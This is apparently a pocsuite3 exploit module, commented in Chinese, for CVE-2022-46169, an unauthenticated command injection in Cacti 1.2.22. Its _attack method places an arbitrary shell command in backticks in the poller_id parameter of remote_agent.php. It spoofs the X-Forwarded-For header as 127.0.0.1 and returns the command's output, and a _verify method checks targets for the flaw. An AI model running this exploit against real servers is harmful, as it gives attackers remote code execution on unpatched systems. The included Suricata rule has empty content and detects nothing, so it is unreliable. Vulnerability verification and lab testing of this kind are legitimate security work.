from pocsuite3.api import Output, POCBase, logger, VUL_TYPE, POC_CATEGORY, OrderedDict, OptString
from pocsuite3.api import register_poc
from pocsuite3.api import requests
import random
import string

def get_filename(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

class Cacti_CVE_2022_46169(POCBase):
    # 非必填的字段，需保留字段名称，值为空
    vulID = 'LDY-2022-00005943'  # 必填，poc id，保持不变即可，后端会自动填写
    version = '1.0'  # 必填，poc版本，从1开始
    author = ['360漏洞云']  # 必填，作者
    vulDate = '2022-12-05'  # 必填，漏洞发布时间
    createDate = '2022-12-27'  # 必填，poc创建时间
    updateDate = '2022-12-27'  # 必填，poc更新时间

    name = 'Cacti_远程命令执行(RCE)_CVE_2022_46169'  # 必填，poc名称，格式 [app名称]_[漏洞名称]_[cve/cnvd号]
    CVE = 'CVE_2022_46169'  # 非必填，cve号，大写
    CNVD = ''  # 非必填，cnvd号，大写
    vulType = VUL_TYPE.CODE_EXECUTION  # 必填，漏洞类型，参考 pocsuite3 VUL_TYPE的取值范围
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # 必填，漏洞分类，参考 pocsuite3 POC_CATEGORY的取值范围
    severity = 'Critical'  # 必填，严重等级，取值范围 Critical , High , Medium, Low
    reqAuth = False  # 必填，boolen值，该漏洞验证或利用是否需要先认证

    appName = 'Cacti'  # 必填，该漏洞对应的应用名称
    fingerprintNames = ['Cacti']  # 必填，当命中哪些指纹后，可使用该poc。列表中是指纹的名称
    app_main_port = 80  # 必填，该应用的默认配置端口，用于快速扫描模式，若无法确认可以写80
    appVersion = 'Cacti=v1.2.22'  # 必填，漏洞影响的版本号

    appPowerLink = 'https://www.oracle.com/'  # 非必填，应用厂商链接
    references = ['https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf']  # 非必填，漏洞相关参考链接
    desc = '''近日360漏洞云监测到cacti官方发布公告,修复了一个存在于cacti v1.2.22版本中的命令注入漏洞,未经身份认证的攻击者可通过控制由get_nfilter_request_var()函数检索的参数$poller_id，来满足poller_item =POLLER_ACTION_SCRIPT_PHP条件，触发proc_open()函数，从而导致命令执行,漏洞编号:CVE-2022-46169,漏洞威胁等级:严重。'''  # 必填，漏洞描述，需尽量详细，参考cnnvd的写法 [应用简介]，[漏洞简介]
    suggest = '''目前Cacti官方已经在v1.2.23和v1.3.0版本修复了相关漏洞，但暂未推出正式的版本更新，建议受影响用户关注官方更新或参考官方补丁代码进行修复：https://github.com/Cacti/cacti/commit/7f0e16312dd5ce20f93744ef8b9c3b0f1ece2216,https://github.com/Cacti/cacti/commit/b43f13ae7f1e6bfe4e8e56a80a7cd867cf2db52b,与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。'''  # 必填，修复建议
    hasExp = True  # 必填，boolen值，是否包含exp
    targets = 'https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169'  # 必填，该Poc适用的目标，string类型 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
    suricata_rules = 'alert tcp any any -> any any (msg:"Cacti_CVE_2022_46169"; content:"";sid:1;classtype:aes; metadata:aes_team_rules;)'  # 必填，suricata格式的检测规则

    def _options(self):
        o = OrderedDict()
        ## verify proxy feature  这三个参数是必须要有的，用于在目标无法出网的情况下的内网无回显漏洞验证，verify_send_url用于触发目标http请求，verify_check_url用于验证无回显漏洞，verify_proxy用于目标无法直连server的情况下走我们搭建的代理
        # o['verify_proxy'] = OptString('', description='对于无回显poc, 验证时curl要使用的socks5代理')
        # o['verify_send_url'] = OptString('', description='对于无回显poc, 验证时用于访问的url')
        # o['verify_check_url'] = OptString('', description='对于无回显poc, 验证时用于检查的url')
        ## verify proxy feature

        o['command'] = OptString('whoami', description='攻击时自定义命令')
        # o["server_ip"] = OptString("", description='rmi、ldap等服务器的ip地址，用于特定场景下的attack或verify')
        # o["server_port"] = OptString("", description='rmi、ldap等服务器的端口，用于特定场景下的attack或verify')
        #o["file_path"] = OptString("", description='待上传文件的绝对路径，一般是webshell文件，用于文件上传的attack')
        return o

    def _verify(self):
        result = {}
        url= self.url.rstrip("/")
        payload_url = url + "/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id="
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0','X-Forwarded-For': '127.0.0.1'}
        payload_data = 1
        try:
            r = requests.get(payload_url, payload_data, headers=headers)
            if r.status_code == 200 and "local_data_id" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            logger.error(f"connect target '{self.url} failed!'")
        return self.parse_output(result)

    def _attack(self):
        filename = get_filename()
        cmd = self.get_option('command')
        #with open(self.get_option("file_path"), "r") as f:
            #f = str(f.read())
            #file_content = f
        result = {}
        url = self.url.rstrip("/")
        payload_url = url + f"/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`{cmd}`"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0','X-Forwarded-For': '127.0.0.1'}
        payload_data = """1"""
        try:
            r = requests.get(payload_url, payload_data, headers=headers)
            if r.status_code == 200:
                result['AttackInfo'] = {}
                result['AttackInfo']['URL'] = url
                #result['AttackInfo']['FILE_URL'] = url + "/" + filename + ".php"
                result['AttackInfo']['Stdout'] = r.text
        except Exception as e:
            logger.error(f"connect target '{self.url} failed!'")
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(Cacti_CVE_2022_46169)

